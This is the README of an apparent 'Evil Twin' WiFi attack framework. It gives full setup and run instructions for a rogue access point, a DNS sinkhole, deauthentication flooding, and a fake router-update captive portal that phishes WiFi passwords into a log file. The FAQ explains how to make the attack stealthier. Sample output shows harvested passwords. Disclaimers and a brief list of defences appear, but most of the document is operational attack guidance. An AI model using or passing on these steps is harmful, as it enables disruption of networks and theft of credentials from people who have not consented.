# Evil Twin Framework v2.0

Educational Security Testing Tool for WiFi Security Assessment

## ⚠️ DISCLAIMER

**This tool is for EDUCATIONAL PURPOSES ONLY.** Use only on networks you own or have explicit permission to test. Unauthorized access to computer networks is illegal and can result in severe legal consequences.

## 📋 Overview

The Evil Twin Framework automates the creation of a Rogue Access Point with a Captive Portal for educational security testing. It integrates with the existing `ghost-kicker.sh` deauthentication tool to provide a complete Evil Twin attack simulation.

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Main Orchestrator                      │
│                        (main.py)                          │
└────────────┬────────────────────────────────────────────┘
             │
    ┌────────┼────────┬────────────┬──────────────┐
    │        │        │            │              │
┌───▼───┐ ┌─▼──────┐ ┌─▼────────┐ ┌─▼──────────┐ ┌─▼─────────┐
│Deauther│ │hostapd │ │ dnsmasq  │ │ Flask App  │ │ iptables  │
│(Scapy) │ │ (Fake  │ │ (DHCP+   │ │ (Captive   │ │ (Traffic  │
│        │ │  AP)   │ │  DNS)    │ │  Portal)   │ │  Redirect)│
└───────┘ └────────┘ └──────────┘ └────────────┘ └───────────┘
```

## 🔧 Components

### 1. **main.py** - Core Orchestrator
- Manages all concurrent processes
- Handles hardware configuration (interface, channel, IP)
- Manages iptables rules for traffic redirection
- Implements graceful cleanup on Ctrl+C

### 2. **deauther.py** - Scapy-based Deauther
- Sends deauthentication packets to target AP
- Supports broadcast and targeted deauth
- Continuous mode with configurable interval

### 3. **hostapd** - Fake Access Point
- Creates rogue AP with same SSID as target
- Open network (no authentication)
- Configurable channel and hardware mode

### 4. **dnsmasq** - Network Manager
- DHCP server for assigning IPs to victims
- DNS server redirecting all queries to local IP
- DNS sinkhole implementation

### 5. **captive_portal.py** - Flask Web Server
- Runs on port 80
- Fake router firmware update login page
- Captures credentials (username, password, SSID)
- Logs all captured data to `log.txt`

### 6. **ghost-kicker.sh** - Deauthentication Tool
- Existing WiFi deauthentication tool
- Can be used independently or with the framework
- Scans networks and performs targeted attacks

## 📦 Dependencies

### System Tools

#### Ubuntu/Debian/Kali Linux
```bash
# Update package list
sudo apt update

# Install required system tools
sudo apt install -y hostapd dnsmasq iptables python3-pip python3-venv

# Verify installations
hostapd -v
dnsmasq --version
iptables --version
python3 --version
```

#### Arch Linux
```bash
# Install required system tools
sudo pacman -S hostapd dnsmasq iptables python python-pip

# Verify installations
hostapd -v
dnsmasq --version
iptables --version
python --version
```

#### Fedora/RHEL
```bash
# Install required system tools
sudo dnf install hostapd dnsmasq iptables python3 python3-pip

# Verify installations
hostapd -v
dnsmasq --version
iptables --version
python3 --version
```

### Python Packages
```bash
# Install from requirements.txt
pip3 install -r requirements.txt
```

**Requirements.txt contents:**
```
flask>=2.3.0
scapy>=2.5.0
```

## 🚀 Complete Setup Guide (Step-by-Step)

### Step 1: Navigate to Project Directory
```bash
cd "ewil twin"
```

### Step 2: Create Python Virtual Environment (Recommended)
```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
# On Linux/Mac:
source venv/bin/activate

# On Windows:
venv\Scripts\activate
```

**Why use virtual environment?**
- Isolates project dependencies from system Python
- Prevents version conflicts
- Makes cleanup easier
- Best practice for Python projects

### Step 3: Upgrade pip (inside venv)
```bash
pip install --upgrade pip
```

### Step 4: Install Python Dependencies
```bash
# Install all required packages
pip install -r requirements.txt

# Or install individually
pip install flask scapy
```

**Verify Python packages:**
```bash
pip list
# Should show:
# flask>=2.3.0
# scapy>=2.5.0
```

### Step 5: Verify System Tools Installation
```bash
# Check hostapd
hostapd -v
# Expected output: hostapd v2.x

# Check dnsmasq
dnsmasq --version
# Expected output: Dnsmasq version 2.x

# Check iptables
iptables --version
# Expected output: iptables v1.x

# Check Python
python3 --version
# Expected output: Python 3.x.x
```

### Step 6: Check Wireless Interface
```bash
# List all network interfaces
ip link show

# Or use iwconfig
iwconfig

# Identify your wireless interface (usually wlan0, wlan1, wlp2s0, etc.)
```

### Step 7: Prepare Wireless Interface in Monitor Mode

#### Option A: Using ghost-kicker.sh (Recommended)
```bash
# Run the deauth tool
sudo ./ghost-kicker.sh

# Select option 1: Enable Monitor Mode
# The tool will automatically:
# - Kill interfering processes
# - Detect your wireless interface
# - Enable monitor mode
# - Show the monitor interface name (e.g., wlan0mon)
```

#### Option B: Manual Setup
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode on your interface (replace wlan0 with your interface)
sudo airmon-ng start wlan0

# Verify monitor mode is enabled
iwconfig
# You should see "Mode:Monitor" on your interface
```

### Step 8: Verify Project Structure
```bash
# List project files
ls -la

# Expected structure:
# main.py
# deauther.py
# captive_portal.py
# ghost-kicker.sh
# requirements.txt
# README.md
# config/
#   ├── hostapd.conf
#   └── dnsmasq.conf
# templates/
#   └── login.html
```

### Step 9: Test Individual Components (Optional)

#### Test Captive Portal Only
```bash
# Activate venv if not already active
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# Run captive portal (requires root for port 80)
sudo python3 captive_portal.py
# Visit http://localhost in your browser to test
# Press Ctrl+C to stop
```

#### Test Deauther Only
```bash
# Activate venv if not already active
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# Run deauther (requires root and monitor mode)
sudo python3 deauther.py --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon
# Replace AA:BB:CC:DD:EE:FF with target AP MAC
# Press Ctrl+C to stop
```

### Step 10: Run Full Framework
```bash
# Ensure venv is active
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# Run main orchestrator (requires root)
sudo python3 main.py
```

## 🎯 Usage

### Using the Full Framework (main.py) - Complete Walkthrough

#### Step 1: Activate Virtual Environment
```bash
# On Linux/Mac
source venv/bin/activate

# On Windows
venv\Scripts\activate

# Verify venv is active (you should see (venv) in your terminal)
```

#### Step 2: Run the Main Orchestrator
```bash
sudo python3 main.py
```

**The framework will display a banner and prompt for configuration:**

```
    ███████╗██╗   ██╗███╗   ██╗ ██████╗ ██╗    ██╗
    ██╔════╝██║   ██║████╗  ██║██╔═══██╗██║    ██║
    █████╗  ██║   ██║██╔██╗ ██║██║   ██║██║ █╗ ██║
    ██╔══╝  ██║   ██║██║╚██╗██║██║   ██║██║███╗██║
    ██║     ╚██████╔╝██║ ╚████║╚██████╔╝╚███╔███╔╝
    ╚═╝      ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══╝╚══╝ 
                    TWIN FRAMEWORK v2.0
        Educational Security Testing Tool

==================================================
TARGET CONFIGURATION
==================================================

[>] Wireless interface [wlan0mon]: wlan0mon
[>] Target BSSID (AP MAC): AA:BB:CC:DD:EE:FF
[>] Target SSID: MyWiFiNetwork
[>] Target channel [1]: 6
[>] Gateway IP [10.0.0.1]: 10.0.0.1

[✓] Target configured:
    SSID: MyWiFiNetwork
    BSSID: AA:BB:CC:DD:EE:FF
    Channel: 6
    Interface: wlan0mon
    Gateway IP: 10.0.0.1
```

#### Step 3: Framework Initialization Process

The framework will automatically execute the following steps:

**1. Interface Configuration**
```bash
[+] Setting wlan0mon to channel 6...
[✓] Interface configured on channel 6
```

**2. IP Address Assignment**
```bash
[+] Configuring IP 10.0.0.1 on wlan0mon...
[✓] IP configured: 10.0.0.1
```

**3. IP Forwarding Enablement**
```bash
[+] Enabling IP forwarding...
[✓] IP forwarding enabled
```

**4. iptables Rules Setup**
```bash
[+] Setting up iptables rules...
[✓] iptables rules configured
```

**5. Configuration File Generation**
```bash
[✓] Generated hostapd.conf: /path/to/config/hostapd.conf
[✓] Generated dnsmasq.conf: /path/to/config/dnsmasq.conf
```

**6. Service Startup**
```bash
==================================================
STARTING SERVICES
==================================================

[+] Starting hostapd...
[✓] hostapd started

[+] Starting dnsmasq...
[✓] dnsmasq started

[+] Starting Flask captive portal...
[✓] Flask server started on port 80

[+] Starting deauther...
[✓] Deauther started
```

**7. Attack Running**
```bash
==================================================
EVIL TWIN ATTACK RUNNING
==================================================
[+] Fake AP: MyWiFiNetwork
[+] Captive Portal: http://10.0.0.1
[+] Credentials log: /path/to/log.txt
[+] Press Ctrl+C to stop and cleanup
==================================================
```

#### Step 4: Monitor the Attack

**View captured credentials in real-time:**
```bash
# In a new terminal, tail the log file
tail -f log.txt
```

**Expected log output:**
```
[2024-04-09 12:34:56] WiFi Password: MyPassword123 | Client IP: 10.0.0.15
[2024-04-09 12:35:23] WiFi Password: AnotherPass456 | Client IP: 10.0.0.22
```

**Check connected clients:**
```bash
# View DHCP leases
sudo cat /var/lib/misc/dnsmasq.leases

# Or check dnsmasq logs
sudo journalctl -u dnsmasq -f
```

#### Step 5: Stop the Attack

Press `Ctrl+C` to stop the framework and perform cleanup:

```bash
[!] Interrupt detected. Cleaning up...
[+] Killing hostapd...
[+] Killing dnsmasq...
[+] Killing Flask server...
[+] Killing deauther...
[+] Flushing iptables rules...
[+] Disabling IP forwarding...
[+] Restarting NetworkManager...
[✓] Cleanup complete. Network restored.
```

### Using Individual Components

#### 1. Deauther Only (Scapy-based)

**Basic Usage:**
```bash
# Activate venv
source venv/bin/activate

# Run deauther
sudo python3 deauther.py --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon
```

**Command Options:**
- `--bssid`: Target AP MAC address (required) - Format: AA:BB:CC:DD:EE:FF
- `--interface`: Wireless interface in monitor mode (required) - e.g., wlan0mon
- `--client`: Target client MAC (optional) - For targeted deauthentication
- `--count`: Number of packets to send (default: 100)
- `--interval`: Interval in seconds for continuous mode (default: 2)
- `--continuous`: Enable continuous deauth mode (flag)

**Examples:**

**Broadcast deauth (all clients):**
```bash
sudo python3 deauther.py --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon --count 50
```

**Targeted deauth (specific client):**
```bash
sudo python3 deauther.py --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon --client 11:22:33:44:55:66
```

**Continuous deauth with custom interval:**
```bash
sudo python3 deauther.py --bssid AA:BB:CC:DD:EE:FF --interface wlan0mon --continuous --interval 5
```

#### 2. Captive Portal Only

**Run standalone captive portal:**
```bash
# Activate venv
source venv/bin/activate

# Run portal (requires root for port 80)
sudo python3 captive_portal.py
```

**Expected output:**
```
==================================================
CAPTIVE PORTAL STARTED
==================================================
[+] Running on http://0.0.0.0:80
[+] Credentials log: /path/to/log.txt
[+] All DNS requests redirected to login page
==================================================
```

**Test the portal:**
```bash
# Open browser and visit
http://localhost
# or
http://10.0.0.1
```

#### 3. Using ghost-kicker.sh (Deauth Tool)

**Run the bash deauth tool:**
```bash
sudo ./ghost-kicker.sh
```

**Menu Options Explained:**

**Option 1: Enable Monitor Mode**
- Automatically detects wireless interface
- Kills interfering processes (NetworkManager, wpa_supplicant)
- Enables monitor mode
- Shows monitor interface name (e.g., wlan0mon)

**Option 2: Scan Networks**
- Scans for nearby WiFi networks
- Displays BSSID, SSID, channel, encryption
- Saves results to CSV file
- Press Ctrl+C to stop scanning

**Option 3: Target Specific Attack**
- Choose manual input or auto-target from scan
- Manual: Enter BSSID and client MAC
- Auto-target: Select from scanned networks
- Configurable smart interval (stealth mode)
- Continuous deauth until Ctrl+C

**Option 4: Chaos Mode (Deauth All Clients)**
- Deauthenticates ALL clients on target network
- Choose manual or auto-target
- Broadcast deauth packets
- Higher impact, less stealth

**Option 5: Disable Monitor Mode & Exit**
- Disables monitor mode
- Restores managed mode
- Restarts NetworkManager
- Exits cleanly

## 📁 Project Structure

```
ewil twin/
├── main.py                 # Core orchestrator
├── deauther.py            # Scapy deauther
├── captive_portal.py      # Flask captive portal
├── ghost-kicker.sh        # Bash deauth tool
├── requirements.txt       # Python dependencies
├── README.md             # This file
├── config/
│   ├── hostapd.conf      # hostapd template
│   └── dnsmasq.conf      # dnsmasq template
├── templates/
│   └── login.html        # Fake login page
└── log.txt               # Captured credentials (created during runtime)
```

## 🔐 Security Considerations

### What This Tool Does
- Creates a fake WiFi access point
- Deauthenticates clients from real AP
- Intercepts DHCP and DNS requests
- Displays a fake login page
- Captures credentials entered by users

### Legal Warning
- **ONLY use on networks you own**
- **Get explicit written permission before testing**
- **Unauthorized use is illegal in most jurisdictions**
- **This is for educational purposes only**

### Defensive Measures
To protect against Evil Twin attacks:
1. Use WPA3 or WPA2-Enterprise with certificate authentication
2. Enable AP isolation on public networks
3. Use VPNs when connecting to public WiFi
4. Verify SSL certificates on all websites
5. Use network security monitoring tools

## 🛠️ Troubleshooting

### Common Issues and Solutions

#### 1. hostapd fails to start

**Symptoms:**
- Error: "Could not read interface flags"
- Error: "nl80211: Driver does not support authentication/association"
- hostapd process exits immediately

**Solutions:**

```bash
# Step 1: Check if interface is in monitor mode
iwconfig
# Should show "Mode:Monitor"

# Step 2: Ensure no other hostapd instance is running
sudo killall hostapd

# Step 3: Check if interface is up
ip link show wlan0mon
# If state is DOWN, bring it up:
sudo ip link set wlan0mon up

# Step 4: Check hostapd configuration in detail
sudo hostapd -dd config/hostapd.conf
# This runs hostapd in debug mode

# Step 5: Verify driver supports AP mode
iw list | grep "Supported interface modes"
# Should include "AP" or "managed"

# Step 6: Try using managed mode instead of monitor mode
# Some drivers don't support AP in monitor mode
sudo airmon-ng stop wlan0mon
# Then use the managed interface directly
```

#### 2. dnsmasq fails to start

**Symptoms:**
- Error: "bind failed: Address in use"
- Error: "dhcp-range: no address range available"
- dnsmasq process exits immediately

**Solutions:**

```bash
# Step 1: Kill existing dnsmasq processes
sudo killall dnsmasq

# Step 2: Check if port 53 (DNS) is in use
sudo netstat -tulpn | grep :53
# If occupied, kill the process or use different port

# Step 3: Check if port 67 (DHCP) is in use
sudo netstat -tulpn | grep :67

# Step 4: Verify dnsmasq configuration syntax
sudo dnsmasq -C config/dnsmasq.conf --test

# Step 5: Check if interface has IP address
ip addr show wlan0mon
# If no IP, assign one:
sudo ip addr add 10.0.0.1/24 dev wlan0mon

# Step 6: Run dnsmasq in foreground to see errors
sudo dnsmasq -C config/dnsmasq.conf -d
```

#### 3. Flask won't bind to port 80

**Symptoms:**
- Error: "Permission denied" when binding to port 80
- Error: "Address already in use"

**Solutions:**

```bash
# Step 1: Check if port 80 is in use
sudo netstat -tulpn | grep :80
# or
sudo lsof -i :80

# Step 2: Kill process using port 80
sudo killall python3
# or kill specific PID
sudo kill -9 <PID>

# Step 3: Ensure you're running as root
sudo python3 captive_portal.py

# Step 4: If still failing, try a different port (requires code change)
# Edit captive_portal.py and change port 80 to 8080
# Then run without sudo:
python3 captive_portal.py
```

#### 4. Clients not getting IP addresses

**Symptoms:**
- Devices connect but get self-assigned IP (169.254.x.x)
- DHCP requests timeout
- No internet connectivity

**Solutions:**

```bash
# Step 1: Check dnsmasq logs for errors
sudo journalctl -u dnsmasq -f
# or run dnsmasq in debug mode:
sudo dnsmasq -C config/dnsmasq.conf -d

# Step 2: Verify interface has IP address
ip addr show wlan0mon
# Should show: inet 10.0.0.1/24

# Step 3: Check if dnsmasq is listening
sudo netstat -tulpn | grep dnsmasq
# Should show listening on :53 (DNS) and :67 (DHCP)

# Step 4: Verify DHCP range in dnsmasq.conf
cat config/dnsmasq.conf | grep dhcp-range
# Should be: dhcp-range=10.0.0.10,10.0.0.50,12h

# Step 5: Check if firewall is blocking DHCP
sudo iptables -L -v
# Allow DHCP traffic if blocked:
sudo iptables -I INPUT -p udp --dport 67 -j ACCEPT
sudo iptables -I INPUT -p udp --dport 68 -j ACCEPT

# Step 6: Restart dnsmasq
sudo killall dnsmasq
sudo dnsmasq -C config/dnsmasq.conf -d
```

#### 5. DNS not redirecting to captive portal

**Symptoms:**
- Clients can access internet without seeing login page
- DNS queries resolve normally

**Solutions:**

```bash
# Step 1: Check dnsmasq DNS configuration
cat config/dnsmasq.conf | grep address
# Should be: address=/#/10.0.0.1

# Step 2: Verify iptables NAT rules
sudo iptables -t nat -L -v -n
# Should see DNAT rule for port 80

# Step 3: Check if Flask is running
sudo netstat -tulpn | grep :80

# Step 4: Test DNS resolution manually
nslookup google.com 10.0.0.1
# Should return 10.0.0.1

# Step 5: Restart services
sudo killall dnsmasq python3
sudo dnsmasq -C config/dnsmasq.conf -d
sudo python3 captive_portal.py
```

#### 6. Deauther not sending packets

**Symptoms:**
- No deauth packets visible in Wireshark
- Clients stay connected to real AP

**Solutions:**

```bash
# Step 1: Verify interface is in monitor mode
iwconfig
# Must show "Mode:Monitor"

# Step 2: Check if you have correct BSSID
# Use ghost-kicker.sh to scan:
sudo ./ghost-kicker.sh
# Select option 2 to scan networks

# Step 3: Verify channel matches target AP
iwconfig wlan0mon channel <channel>

# Step 4: Check for driver support
iw list | grep "Supported command modes"
# Should include "AP" and "monitor"

# Step 5: Try aireplay-ng as alternative
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

# Step 6: Run deauther with verbose output
sudo python3 deauther.py --bssid <BSSID> --interface wlan0mon --count 10
```

#### 7. Cleanup failed (network not restored)

**Symptoms:**
- Network not working after stopping framework
- Monitor mode still active
- iptables rules still present

**Solutions:**

```bash
# Step 1: Kill all processes
sudo killall hostapd dnsmasq python3

# Step 2: Flush iptables rules
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -X
sudo iptables -t nat -X

# Step 3: Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Step 4: Disable monitor mode
sudo airmon-ng stop wlan0mon
# or
sudo iwconfig wlan0mon mode managed

# Step 5: Restart network services
sudo systemctl restart NetworkManager
# or
sudo systemctl restart networking

# Step 6: If still not working, reboot
sudo reboot
```

#### 8. Virtual Environment Issues

**Symptoms:**
- "Module not found" errors
- Wrong Python version
- pip not working

**Solutions:**

```bash
# Step 1: Deactivate current venv
deactivate

# Step 2: Remove old venv
rm -rf venv

# Step 3: Create new venv with specific Python version
python3 -m venv venv

# Step 4: Activate venv
source venv/bin/activate  # Linux/Mac
# or
venv\Scripts\activate  # Windows

# Step 5: Upgrade pip
pip install --upgrade pip

# Step 6: Reinstall dependencies
pip install -r requirements.txt

# Step 7: Verify installation
pip list
python --version
```

## ❓ Frequently Asked Questions (FAQ)

### Q: Do I need to run this as root?
**A:** Yes, most components require root privileges:
- hostapd needs root to create access points
- dnsmasq needs root for DHCP/DNS
- Flask needs root to bind to port 80
- iptables needs root to modify firewall rules
- Monitor mode requires root

### Q: Can I use this on any wireless card?
**A:** No, your wireless card must support:
- Monitor mode
- AP mode (master mode)
- Packet injection

**Recommended cards:**
- Alfa AWUS036NHA
- TP-Link TL-WN722N (v1/v2)
- Panda PAU09
- Any Atheros-based card

**Check your card:**
```bash
iw list
# Look for "Supported interface modes" including "AP" and "monitor"
```

### Q: Is this legal to use?
**A:** **ONLY use on networks you own or have explicit written permission to test.** Unauthorized access to computer networks is illegal and can result in severe legal consequences including fines and imprisonment.

### Q: Can victims detect the evil twin?
**A:** Yes, experienced users can detect evil twins by:
- Checking MAC address of AP
- Using WiFi analyzer tools
- Noticing duplicate SSIDs
- Checking SSL certificates

### Q: Why do clients need to enter WiFi password?
**A:** The fake AP is open (no encryption). The login page is a phishing attempt to capture the WPA/WPA2 password of the real network.

### Q: Can I capture WPA2 handshakes with this?
**A:** This framework focuses on phishing credentials, not capturing handshakes. For WPA2 handshake capture, use tools like `aircrack-ng` suite with `airodump-ng` and `aireplay-ng`.

### Q: How do I make the attack more stealthy?
**A:** To be more stealthy:
- Use longer deauth intervals (e.g., 5-10 seconds)
- Target specific clients instead of broadcast
- Use lower transmission power
- Mimic the real AP's MAC address
- Match the real AP's channel hopping behavior

### Q: Can I use this on Windows?
**A:** No, this framework is designed for Linux. Windows doesn't support monitor mode or the required network tools (hostapd, dnsmasq, iptables).

### Q: What if I get "Permission denied" errors?
**A:** Ensure you're running with sudo:
```bash
sudo python3 main.py
sudo python3 captive_portal.py
sudo python3 deauther.py --bssid <BSSID> --interface wlan0mon
```

### Q: How do I view captured credentials?
**A:** Credentials are saved to `log.txt`:
```bash
cat log.txt
# or tail for real-time updates
tail -f log.txt
```

### Q: Can I customize the login page?
**A:** Yes, edit `templates/login.html`:
- Change colors and styling
- Modify form fields
- Add custom logos
- Change the text and branding

### Q: What happens if I forget to stop the framework?
**A:** The framework includes cleanup handlers, but if it crashes:
```bash
# Manual cleanup
sudo killall hostapd dnsmasq python3
sudo iptables -F
sudo iptables -t nat -F
sudo sysctl -w net.ipv4.ip_forward=0
sudo systemctl restart NetworkManager
```

### Q: Can I use this for penetration testing?
**A:** Yes, this is designed for educational security testing and authorized penetration testing. Always:
- Get written permission
- Document your testing scope
- Follow responsible disclosure
- Use only for legitimate security assessment

## 📊 Captured Credentials Format

Credentials are saved to `log.txt` in the following format:
```
[2024-04-09 12:34:56] WiFi Password: MyPassword123 | Client IP: 10.0.0.15
```

**View captured credentials:**
```bash
# View all credentials
cat log.txt

# Monitor in real-time
tail -f log.txt

# Count total captures
wc -l log.txt
```

## 🔧 Customization

### Modify the Login Page
Edit `templates/login.html` or the `LOGIN_HTML` variable in `captive_portal.py` to change the appearance and fields of the captive portal.

### Change DHCP Range
Modify the `dhcp-range` in `config/dnsmasq.conf` or update the `target_config` dictionary in `main.py`.

### Change Gateway IP
Update the `gateway_ip`, `dhcp_start`, and `dhcp_end` values in `main.py`.

## 📚 Educational Resources

- [WiFi Security Basics](https://www.kali.org/tools/aircrack-ng/)
- [Evil Twin Attack Explained](https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks))
- [Captive Portal Security](https://owasp.org/www-community/attacks/Captive_Portal)

## 🤝 Contributing

This is an educational project. Feel free to submit issues or pull requests for improvements.

## ⚖️ License

This project is for educational purposes only. Use responsibly and legally.

## 📞 Support

For issues or questions, please refer to the troubleshooting section above.

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
"# let-me-fish" 
